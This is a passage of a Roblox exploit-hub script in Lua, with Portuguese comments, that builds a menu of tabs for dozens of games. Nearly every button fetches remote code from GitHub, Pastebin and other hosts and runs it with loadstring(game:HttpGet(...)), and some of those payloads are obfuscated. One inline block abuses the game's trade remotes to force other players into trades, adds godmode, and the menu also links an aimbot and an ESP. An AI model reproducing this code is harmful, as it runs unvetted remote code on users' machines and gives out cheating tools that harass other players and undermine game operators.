    Name = "Zephyr (Funciona no Pc/Mobile)",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealAvrwm/Projects/main/Xeno%20MVSD%20script.lua", true))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para Anime Stars Simulator
local AnimeStarsSimulatorTab = Window:MakeTab({
    Name = "Anime Stars Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local AnimeStarsSimulatorTab = AnimeStarsSimulatorTab:AddSection({
    Name = "Anime Stars Simulator"
})

-- Botão para executar o script Anime Stars Simulator
AnimeStarsSimulatorTab:AddButton({
    Name = "TMiumi Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/bunny42312/script/main/animestar"))()
        
        -- Notificação de sucesso

    end    
})

-- Criando a aba 
local DrivingEmpireTab = Window:MakeTab({
    Name = "Driving Empire",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
DrivingEmpireTab:AddSection({
    Name = "Driving Empire"
})

-- Adicionando o botão para executar o script
DrivingEmpireTab:AddButton({
    Name = "Execute",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Aaron999S/FiberHub/main/Main"))()
        -- Notificação de sucesso após a execução

    end    
})


-- Criando a aba para 
local MotorcycleMayhembTab = Window:MakeTab({
    Name = "SMotorcycle Mayhem",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local MotorcycleMayhembTab = MotorcycleMayhembTab:AddSection({
    Name = "Motorcycle Mayhem"
})

-- Botão para executar o script 
MotorcycleMayhembTab:AddButton({
    Name = "Motorcycle Mayhem",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Milan08Studio/ChairWare/main/main.lua"))()
        
        -- Notificação de sucesso

    end    
})

-- Criando a aba para A Slap Battles
local ALONETab = Window:MakeTab({
    Name = "ALONE",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local ALONETab = ALONETab:AddSection({
    Name = "ALONE"
})

-- Botão para executar o script Slap Battles
ALONETab:AddButton({
    Name = "Fart Script",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
loadstring(game:HttpGet(("https://raw.githubusercontent.com/Sussy-Tech/Scripts/main/FartHub.lua"),true))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para 
local GoFishingTab = Window:MakeTab({
    Name = "GO FISHING",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local GoFishingTab = GoFishingTab:AddSection({
    Name = "GO FISHING"
})

-- Botão para executar o script
GoFishingTab:AddButton({
    Name = "OhMyGehlee Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/go/refs/heads/main/is"))()

        -- Notificação de sucessoa

    end    
})

-- Criando a aba para 
local GoalBattlesTab = Window:MakeTab({
    Name = "Goal Battles",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local GoalBattlesTab = GoalBattlesTab:AddSection({
    Name = "Goal Battles"
})

-- Botão para executar o script 
GoalBattlesTab:AddButton({
    Name = "Goal Battles",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://pastebin.com/raw/eGqj2qNk"))()
        
        -- Notificação de sucesso

    end    
})

-- Criando a aba para 
local CameraTowerDefenseRebornTab = Window:MakeTab({
    Name = "Camera Tower Defense Reborn",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local CameraTowerDefenseRebornTab = CameraTowerDefenseRebornTab:AddSection({
    Name = "Camera Tower Defense Reborn"
})

-- Botão para executar o script 
CameraTowerDefenseRebornTab:AddButton({
    Name = "Camera Tower Defense",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/CameraTower"))()

    end    
})

-- Criando a aba para A Sols Rng
local BlueLockRivalsTab = Window:MakeTab({
    Name = "Blue Lock: Rivals",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local BlueLockRivalsTab = BlueLockRivalsTab:AddSection({
    Name = "Blue Lock: Rivals"
})

-- Botão para executar o script Slap Battles
BlueLockRivalsTab:AddButton({
    Name = "Style Selector",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://pastebin.com/raw/D1M2PLua", true))()

    end    
})

-- Criando a aba para A Sols Rng
local MyPetRockTab = Window:MakeTab({
    Name = "My Pet Rock",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local MyPetRockTab = MyPetRockTab:AddSection({
    Name = "My Pet Rock"
})

-- Botão para executar o script Slap Battles
MyPetRockTab:AddButton({
    Name = "Op stuff",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://gitlab.com/RobloxiaUntilDawn/robloxia-until-dawn/-/raw/main/script"))()

    end    
})

-- Criando a aba 
local DragonAdventuresTab = Window:MakeTab({
    Name = "Dragon Adventures",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
DragonAdventuresTab:AddSection({
    Name = "Dragon Adventures"
})

-- Adicionando o botão para executar o script
DragonAdventuresTab:AddButton({
    Name = "Imp Hub",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet('https://raw.githubusercontent.com/alan11ago/Hub/refs/heads/main/ImpHub.lua'))()
        -- Notificação de sucesso após a execução

    end    
})

-- Adicionando o botão para executar o script
DragonAdventuresTab:AddButton({
    Name = "Execute",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://github.com/h8h88/DAthingy/raw/refs/heads/main/DAhalloween"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba para 
local GoalBattlesTab = Window:MakeTab({
    Name = "Smash Things",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local GoalBattlesTab = GoalBattlesTab:AddSection({
    Name = "Smash Things"
})

-- Botão para executar o script 
GoalBattlesTab:AddButton({
    Name = "ExploitFin",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterGuy/FBC/refs/heads/main/Protected_2920441766829278.txt"))()
        
        -- Notificação de sucesso

    end    
})


-- Criando a aba para A Slap Battles
local LegendsReWrittenTab = Window:MakeTab({
    Name = "Legends Re:Written",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local LegendsReWrittenTab = LegendsReWrittenTab:AddSection({
    Name = "Legends Re:Written"
})

-- Botão para executar o script Slap Battles
LegendsReWrittenTab:AddButton({
    Name = "Legends Re:Written",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        local UI = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
        local Window = UI:CreateWindow({
            Name = 'Legends Re:Written',
            LoadingTitle = 'Script Loading',
            LoadingSubtitle = 'Legends Rewritten',
            ConfigurationSaving = {
                Enabled = true,
                FolderName = nil, 
                FileName = "Legends Rewritten"
            },
                Discord = {
                    Enabled = false,
                    Invite = "",
                    RememberJoins = false 
                },
            KeySystem = false, 
            KeySettings = {
                Title = "Sirius Hub",
                Subtitle = "Key System",
                Note = "Join the discord (discord.gg/sirius)",
                FileName = "SiriusKey",
                SaveKey = true,
                GrabKeyFromSite = false,
                Key = "Hello"
            }
        })
        UI:Notify({
                    Title = "Warning",
                    Content = "Using Force random trade and Make random plr trade you too fast causes game to kick you.",
                    Duration = 6.5,
                    Image = 4483362458,
                    Actions = { -- Notification Buttons
                        Ignore = {
                            Name = "Okay!",
                            Callback = function()
                                warn'Ok'
                            end
                        },
                    },
                })
        local plrtable = {};
        for i,v in pairs(game.Players:GetPlayers()) do
            if not table.find(plrtable, v.Name) then
                table.insert(plrtable, v.Name)
            end
        end
        game.Players.PlayerAdded:Connect(function()
                for i,v in pairs(game.Players:GetPlayers()) do
                if not table.find(plrtable, v.Name) then
                    table.insert(plrtable, v.Name)
                end
            end
        end)
        local Tab2 = Window:CreateTab('Main', 4483362458)
        local Section2 = Tab2:CreateSection('Player Stuff')
        local Toggle = Tab2:CreateToggle({
            Name = 'GodMode',
            CurrentValue = false,
            Flag = "Gmode", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
            Callback = function(val)
                getgenv().god = val
                while getgenv().god and task.wait() do
                    game:GetService("Players").LocalPlayer.PlayerGui.Parkour.Script.iFrame:FireServer()
                end
            end,
        })
        local GM2 = Tab2:CreateButton({
            Name = 'GodMode 2',
            Callback = function()
                game.Players.LocalPlayer.Character.Counter:Destroy()
            end,
        })
        local Section3 = Tab2:CreateSection('Annoy')
        local Dropdown = Tab2:CreateDropdown({
            Name = "Target Player",
            Options = plrtable,
            CurrentOption = 'Nil',
            Flag = "target", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
            Callback = function(Option)
                    targetplr = Option
                    print(targetplr)
            end,
        })
        local Dropdown = Tab2:CreateDropdown({
            Name = "Target Player 2",
            Options = plrtable,
            CurrentOption = 'Nil',
            Flag = "target", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
            Callback = function(op)
                    targetplr2 = op
                    print(targetplr2)
            end,
        })
        local TradePlr = Tab2:CreateButton({
            Name = "Make Target Trade You",
            Callback = function()
                local targ = game.Players[targetplr]
                local lp = game.Players.LocalPlayer
                game:GetService("ReplicatedStorage").Remotes.SendTradeRequest:FireServer(targ, lp)
            end,
        })
        local ForceTradePlr = Tab2:CreateButton({
            Name = "Force Trade with target",
            Callback = function()
                local targ = game.Players[targetplr]
                local lp = game.Players.LocalPlayer	
                game:GetService("ReplicatedStorage").Remotes.AddTradeFrame:FireServer(targ, lp)
            end,
        })
        
        local ForceTradePlrR = Tab2:CreateButton({
            Name = "Force Trade Random",
            Callback = function()
                local targ = game.Players:GetPlayers()[math.random(1, #plrtable)]
                local lp = game.Players.LocalPlayer	
                game:GetService("ReplicatedStorage").Remotes.AddTradeFrame:FireServer(targ, lp)
            end,
        })
        local ForceTradePlr2P = Tab2:CreateButton({
            Name = "Force Trade Random 2 Players",
            Callback = function()
                local targ = game.Players:GetPlayers()[math.random(1, #plrtable)]
                local targ2 = game.Players:GetPlayers()[math.random(1, #plrtable)]	
                game:GetService("ReplicatedStorage").Remotes.AddTradeFrame:FireServer(targ, targ2)
            end,
        })
        local ForceTradePlr2P = Tab2:CreateButton({
            Name = "Force Trade 2 Players",
            Callback = function()
                local targ = game.Players[targetplr]
                local targ2 = game.Players[targetplr2]
                game:GetService("ReplicatedStorage").Remotes.AddTradeFrame:FireServer(targ, targ2)
            end,
        })
        local TradePlrR = Tab2:CreateButton({
            Name = "Make Random Trade You",
            Callback = function()
                local targ = game.Players:GetPlayers()[math.random(1, #plrtable)]
                local lp = game.Players.LocalPlayer	
                game:GetService("ReplicatedStorage").Remotes.SendTradeRequest:FireServer(targ, lp)
            end,
        })
        local TradePlrR = Tab2:CreateButton({
            Name = "Make Random Trade Another Person",
            Callback = function()
                local targ = game.Players:GetPlayers()[math.random(1, #plrtable)]
                local targ2 = game.Players:GetPlayers()[math.random(1, #plrtable)]	
                game:GetService("ReplicatedStorage").Remotes.SendTradeRequest:FireServer(targ, lp)
            end,
        })        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local SolsRngTab = Window:MakeTab({
    Name = "Sols Rng",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local SolsRngTab = SolsRngTab:AddSection({
    Name = "Sols Rng"
})

-- Botão para executar o script Slap Battles
SolsRngTab:AddButton({
    Name = "Erudite Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThacG/EruditeHub/main/Sol's%20RNG/V2"))()
        -- Notificação de sucessoa
    end    
})

-- Botão para executar o script Slap Battles
SolsRngTab:AddButton({
    Name = "Beecon Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub"))()
    end    
})

-- Criando a aba para 
local CarZoneBetaTab = Window:MakeTab({
    Name = "Car Zone Beta",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local CarZoneBetaTab = CarZoneBetaTab:AddSection({
    Name = "Car Zone Beta"
})

-- Botão para executar o script 
CarZoneBetaTab:AddButton({
    Name = "Car Zone Beta",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tora//main/CarZoneBeta"))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para One Fruit
local OneFruitTab = Window:MakeTab({
    Name = "One Fruit",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local OneFruitSection = OneFruitTab:AddSection({
    Name = "Controle do Script"
})

-- Botão para executar o script One Fruit
OneFruitTab:AddButton({
    Name = "Nexus Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CrazyHub123/NexusHubMain/main/Main.lua", true))()
        

    end    
})

-- Criando a aba para A EGG EMPIRE
local EggEmpireTab = Window:MakeTab({
    Name = "Anime Blast Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local EggEmpireTab = EggEmpireTab:AddSection({
    Name = "Egg Empire"
})

-- Botão para executar o script EGG EMPIRE
EggEmpireTab:AddButton({
    Name = "Bloxy Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxyhub-script/bloxyhub/main/Loader"))()

    end    
})

-- Criando a aba para A Sols Rng
local PopItTradingTab = Window:MakeTab({
    Name = "Pop It Trading",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local PopItTradingTab = PopItTradingTab:AddSection({
    Name = "Pop It Trading"
})

-- Botão para executar o script Slap Battles
PopItTradingTab:AddButton({
    Name = "Xdkert1",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet('https://pastebin.com/raw/tTg5Yjpi'))()

    end    
})

-- Criando a aba 
local DungeonRNGTab = Window:MakeTab({
    Name = "Dungeon RNG",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
DungeonRNGTab:AddSection({
    Name = "Dungeon RNG"
})

-- Adicionando o botão para executar o script
DungeonRNGTab:AddButton({
    Name = "Execute",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/DungeonRNG"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Adicionando o botão para executar o script
DungeonRNGTab:AddButton({
    Name = "Execute 2",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet('https://raw.githubusercontent.com/trawma/trawma/main/trawma(upd).lua'))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba 
local StreetzWar2Tab = Window:MakeTab({
    Name = "Streetz War 2",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
StreetzWar2Tab:AddSection({
    Name = "Streetz War 2"
})

-- Adicionando o botão para executar o script
StreetzWar2Tab:AddButton({
    Name = "Pop it trading",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://nullclient.xyz/pooptradingscriopt.txt"))()

    end    
})

-- Criando a aba 
local SakuraStandTab = Window:MakeTab({
    Name = "Sakura Stand",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
SakuraStandTab:AddSection({
    Name = "Sakura Stand"
})

-- Adicionando o botão para executar o script
SakuraStandTab:AddButton({
    Name = "Nex Hub",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CopyReal/NexHub/main/NexHubLoader"))()
        -- Notificação de sucesso após a execução

    end    
})

-- Botão para executar o script One Fruit
OneFruitTab:AddButton({
    Name = "ZaRdoOx",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Loader/main/PlatiniumLoader"))()
        
    end    
})

-- Criando a aba para Anime Champions Simulator
local AnimeChampionSimulatorTab = Window:MakeTab({
    Name = "Anime Champions Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local AnimeChampionSimulatorTab = AnimeChampionSimulatorTab:AddSection({
    Name = "Anime Champions Simulator"
})

-- Botão para executar o script Anime Champions Simulator
AnimeChampionSimulatorTab:AddButton({
    Name = "Yuto Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JuninhoOGado/ScriptsSite/main/Script244"))()

    end    
})

-- Criando a aba anime shadow
local MadCityChapter2Tab= Window:MakeTab({
    Name = "Mad City Chapter 2",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba Anime Shadow
MadCityChapter2Tab:AddSection({
    Name = "Mad City Chapter 2"
})

-- Corrigindo o botão Anime Shadow
MadCityChapter2Tab:AddButton({
    Name = "Mad City Chapter 2 Script",
    Callback = function()
        -- Executando o script do Anime Shadow
        loadstring(game:HttpGet("https://raw.githubusercontent.com/castyhwprivateez/v1.6666666-w..ww..what-/main/Protected%20(46).lua%22"))()

    end    
})


-- Criando a aba para A Sols Rng
local RarityFactoryTab = Window:MakeTab({
    Name = "Rarity Factory",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local RarityFactoryTab = RarityFactoryTab:AddSection({
    Name = "Rarity Factory"
})

-- Botão para executar o script Slap Battles
RarityFactoryTab:AddButton({
    Name = "Nau Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/naufalafif080419/NauHubLoadstring/main/Loadstring.lua')))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba anime shadow
local WestboundTab= Window:MakeTab({
    Name = "Westbound",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba Anime Shadow
WestboundTab:AddSection({
    Name = "Westbound"
})

-- Corrigindo o botão Anime Shadow
WestboundTab:AddButton({
    Name = "Westbound Pro",
    Callback = function()
        -- Executando o script do Anime Shadow
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/westbound.pro-Utilites/main/Main.lua"))()
        

    end    
})

-- Criando a aba 
local DoorsTab = Window:MakeTab({
    Name = "Doors",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
DoorsTab:AddSection({
    Name = "Doors"
})

-- Adicionando o botão para executar o script
DoorsTab:AddButton({
    Name = "Bob Hub",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/012b8bc02b1c578b7766f2a4511c3c47.lua"))()

    end    
})

-- Adicionando o botão para executar o script
DoorsTab:AddButton({
    Name = "Blackking",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()

    end    
})

-- Criando a aba Anime Simulator
local AnimeSimulatorTab = Window:MakeTab({
    Name = "Anime Simulator",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba Anime Simulator
AnimeSimulatorTab:AddSection({
    Name = "Anime Simulator"
})

-- Adicionando o botão para executar o script
AnimeSimulatorTab:AddButton({
    Name = "LyzerHub",
    Callback = function()
        -- Executa o script do Anime Simulator
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Kazeruy/LyzerHub/main/ScriptMain"))()
        

    end    
})

-- Criando a aba
local UniversalHubTab = Window:MakeTab({
    Name = "Universal Script",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
UniversalHubTab:AddSection({
    Name = "Universal Script"
})

-- Corrigindo o botão 
UniversalHubTab:AddButton({
    Name = "Esp Universal",
    Callback = function()
        -- Executando o script do
        loadstring(game:HttpGet("https://pastebin.com/raw/e5y42XK0"))()

    end    
})

-- Criando a aba
local CombatWarriorsTab = Window:MakeTab({
    Name = "Combat Warriors",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
CombatWarriorsTab:AddSection({
    Name = "Combat Warriors"
})

-- Corrigindo o botão 
CombatWarriorsTab:AddButton({
    Name = "Script 1",
    Callback = function()
        -- Executando o script do
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Voltrivax/hwid/refs/heads/main/Freenium"))()

    end    
})

-- Corrigindo o botão 
CombatWarriorsTab:AddButton({
    Name = "Script 2",
    Callback = function()
        -- Executando o script do
        loadstring(game:HttpGet("https://raw.githubusercontent.com/nikoladhima/Combat/refs/heads/main/CombatAimbot"))()

    end    
})

-- Corrigindo o botão 
CombatWarriorsTab:AddButton({
    Name = "Script 3",
    Callback = function()
        -- Executando o script do
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XorV2/script/main/Unfair"))()

    end    
})

-- Corrigindo o botão 
CombatWarriorsTab:AddButton({
    Name = "Script 3",
    Callback = function()
        -- Executando o script do
        loadstring(game:HttpGet("https://pastebin.com/raw/QXMXfqWN"))()
    end    
})


-- Criando a aba para One Fruit
local CarRaceSimulatorTab = Window:MakeTab({
    Name = "Car Race Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba Car Race Simulator
local  CarRaceSimulatorTab = CarRaceSimulatorTab:AddSection({
    Name = "Car Race Simlator"
})

-- Botão para executar o script Car Race Simulator
CarRaceSimulatorTab:AddButton({
    Name = "Tora IsMe",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/CarRace"))()
        

    end    
})

-- Criando a aba para A Sols Rng
local ShadowBoxingBattlesTab = Window:MakeTab({
    Name = "Shadow Boxing Battles",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local ShadowBoxingBattlesTab = ShadowBoxingBattlesTab:AddSection({
    Name = "Shadow Boxing Battles"
})

-- Botão para executar o script Slap Battles
ShadowBoxingBattlesTab:AddButton({
    Name = "Flare Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/imwifi/1FO/main/main.lua"))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba 
local BoogaBoogaTab = Window:MakeTab({
    Name = "Booga Booga",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
BoogaBoogaTab:AddSection({
    Name = "Booga Booga"
})

-- Adicionando o botão para executar o script
BoogaBoogaTab:AddButton({
    Name = "Slideurs-Hub",
    Callback = function()
        -- Executa o script do 
        loadstring(game:HttpGet('https://raw.githubusercontent.com/boogauser3533/natsuloader/main/SlideursHub-Loader.lua'))()
        -- Notificação de sucesso após a execução

    end    
})

-- Criando a aba para A Sols Rng
local StudJumpObbyTab = Window:MakeTab({
    Name = "Stud Jump Obby",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local StudJumpObbyTab = StudJumpObbyTab:AddSection({
    Name = "Stud Jump Obby"
})

-- Botão para executar o script Slap Battles
StudJumpObbyTab:AddButton({
    Name = "Stud Jump Obby",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/imwifi/1FO/main/main.lua"))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local PunchMonsterstTab = Window:MakeTab({
    Name = "Punch Monsters",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local PunchMonsterstTab = PunchMonsterstTab:AddSection({
    Name = "Punch Monsters"
})

-- Botão para executar o script Slap Battles
PunchMonsterstTab:AddButton({
    Name = "Punch Monsters",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Moligrafi001/Hallow-Hub/main/Loader.lua",true))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local CheeseFactoryTycoonTab = Window:MakeTab({
    Name = "Cheese Factory Tycoon",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local CheeseFactoryTycoonTab = CheeseFactoryTycoonTab:AddSection({
    Name = "Cheese Factory Tycoon"
})

-- Botão para executar o script Slap Battles
CheeseFactoryTycoonTab:AddButton({
    Name = "Raccoon Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet('https://raw.githubusercontent.com/RaCc0oN1/RobloxObf/main/MainHub'))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local TypeorDieTab = Window:MakeTab({
    Name = "Type or Die",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local TypeorDieTab = TypeorDieTab:AddSection({
    Name = "Type or Die"
})

-- Botão para executar o script Slap Battles
TypeorDieTab:AddButton({
    Name = "Type or Die",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet('https://pastebin.com/raw/A6H1KMFp'))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local LuckyBlocksBattlegroundsTab = Window:MakeTab({
    Name = "LUCKY BLOCKS Battlegrounds",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local LuckyBlocksBattlegroundsTab = LuckyBlocksBattlegroundsTab:AddSection({
    Name = "LUCKY BLOCKS Battlegrounds"
})

-- Botão para executar o script Slap Battles
LuckyBlocksBattlegroundsTab:AddButton({
    Name = "Lucky Blocks Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para A Sols Rng
local LuckyBlocksBattlegroundsTab = Window:MakeTab({
    Name = "LUCKY BLOCKS Battlegrounds",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local LuckyBlocksBattlegroundsTab = LuckyBlocksBattlegroundsTab:AddSection({
    Name = "LUCKY BLOCKS Battlegrounds"
})

-- Botão para executar o script Slap Battles
LuckyBlocksBattlegroundsTab:AddButton({
    Name = "Lucky Blocks Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba 
local GraceTab = Window:MakeTab({
    Name = "Grace",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
GraceTab:AddSection({
    Name = "Grace"
})

-- Adicionando o botão para executar o script
GraceTab:AddButton({
    Name = "Aussie WIRE",
